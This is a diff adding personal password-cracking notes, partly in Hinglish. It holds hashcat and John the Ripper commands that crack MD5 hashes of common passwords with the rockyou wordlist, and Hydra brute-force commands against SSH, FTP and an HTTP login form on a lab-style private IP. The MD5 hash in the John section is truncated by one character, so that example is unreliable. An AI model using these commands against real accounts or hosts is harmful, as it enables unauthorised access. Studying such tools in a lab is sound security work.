@@ -1,0 +1,67 @@
+HASHCAT
+| Password   | MD5 Hash                           |
+| ---------- | ---------------------------------- |
+| `12345`    | `827ccb0eea8a706c4c34a16891f84e7b` |
+| `123456`   | `e10adc3949ba59abbe56e057f20f883e` |
+| `password` | `5f4dcc3b5aa765d61d8327deb882cf99` |
+| `admin`    | `21232f297a57a5a743894a0e4a801fc3` |
+| `qwerty`   | `d8578edf8458ce06fbc5bb76a58c5ca4` |
+| `abc123`   | `e99a18c428cb38d5f260853678922e03` |
+  ye hash h isko decrypt krna h isko h1.text mai dalo
+hashcat --benchmark  // bs aise hi h
+
+hashcat -a 0 -m 0 h1.text /usr/share/wordlists/rockyou.txt
+hashcat -a 0 -m 0 h1.text /usr/share/wordlists/rockyou.txt --outfile out.txt
+cat out.txt
+
+if ypar wala kaam nahi then yesb
+
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt upr nhi toh ye
+
+hashcat --show hash.txt
+
+If rockyou.txt is Compressed
+sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+JOHN THE RIPPER
+Inside the run folder:
+Create file:
+hash.txt
+Add an easy MD5 hash:
+5f4dcc3b5aa765d61d8327deb882cf9
+commands
+john hash.txt --format=RAW-MD5
+
+john --show hash.txt
+
+sudo apt install john
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+john --show hash.txt
+
+
+
+
+HYDRA
+hydra -h
+sudo apt update
+sudo apt install hydra
+Basic Hydra Syntax
+hydra -l username -P passwordlist.txt target service
+Meaning:
+-l → single username
+-P → password list
+target → IP or website
+service → protocol (ssh, ftp, http, etc.)
+
+nano pass.txt
+1234
+password
+admin
+123456
+CTRL + X → Y → Enter
+main cheeze abh se start
+hydra -l kali -P pass.txt 192.168.1.10 ssh
+hydra -l ftpuser -P pass.txt 192.168.1.10 ftp
+hydra -l admin -P pass.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid login"
+hydra -L users.txt -P pass.txt 192.168.1.10 ssh
+hydra -L users.txt -P pass.txt 192.168.1.10 ssh
